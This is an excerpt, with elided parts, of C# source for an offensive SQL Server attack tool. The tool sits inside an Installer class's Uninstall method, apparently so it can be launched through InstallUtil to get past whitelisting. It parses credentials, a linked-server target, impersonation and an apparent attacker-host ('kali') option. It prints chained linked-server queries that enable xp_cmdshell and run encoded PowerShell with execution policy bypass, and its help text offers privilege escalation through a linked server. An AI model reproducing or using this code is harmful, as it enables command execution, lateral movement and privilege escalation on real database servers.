    ...
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            while (true)
            {
                ...
                string[] parsedArgs = input.Split((char[])null, StringSplitOptions.RemoveEmptyEntries);
                ...
                for (int i = 0; i < parsedArgs.Length; i++)
                {
                    switch (parsedArgs[i])
                    {
                        case "-s": if (i + 1 < parsedArgs.Length) sqlServer = parsedArgs[++i]; break;
                        case "-c": if (i + 1 < parsedArgs.Length) sqlContext = parsedArgs[++i]; break;
                        case "-d": if (i + 1 < parsedArgs.Length) database = parsedArgs[++i]; break;
                        case "-a": if (i + 1 < parsedArgs.Length) action = parsedArgs[++i]; break;
                        case "-u": if (i + 1 < parsedArgs.Length) username = parsedArgs[++i]; break;
                        case "-p": if (i + 1 < parsedArgs.Length) password = parsedArgs[++i]; break;
                        case "-l": if (i + 1 < parsedArgs.Length) linkedServer = parsedArgs[++i]; break;
                        case "-k": if (i + 1 < parsedArgs.Length) kali = parsedArgs[++i]; break;
                        case "-i": if (i + 1 < parsedArgs.Length) impersonate = parsedArgs[++i]; break;
                        case "-n": if (i + 1 < parsedArgs.Length) port = parsedArgs[++i]; break;
                        case "-h": help = true; break;
                        case "-q": queries = true; break;
                        case "-m": if (i + 1 < parsedArgs.Length) intsec = parsedArgs[++i]; break;
                    }
                }

                try
                {
                    ExecuteSqlOperation(sqlServer, port, sqlContext, database, action, username, password, linkedServer, kali, impersonate, intsec, help, queries);
                }
                catch (Exception ex)
                {
       ...
       public static void ExecuteSqlOperation(string sqlServer, string port, string sqlContext, string database, string action, string username, string password, string linkedServer, string kali, string impersonate, string intsec, bool help, bool queries)
           {
            if (queries == true)
            {
                ...
                Console.WriteLine("EXEC('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [sqlServer]') AT[linkedServer]; EXEC('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [sqlServer}]') AT[linkedServer]; EXEC(' EXEC (''xp_cmdshell ''''powershell -nop -ep bypass -enc encodedCmd'''';'') AT sqlServer') AT linkedServer");
            ...
            else if (help == true || (string.IsNullOrEmpty(sqlServer) || string.IsNullOrEmpty(database) || string.IsNullOrEmpty(action) || string.IsNullOrEmpty(sqlContext)))
            {
                ...
                Console.WriteLine("\nExample: .\\sqlexec.exe -s server1 -d master -a user -c linked");
                ...
                Console.WriteLine("  privenable    : Perform local privesc through a linked server");
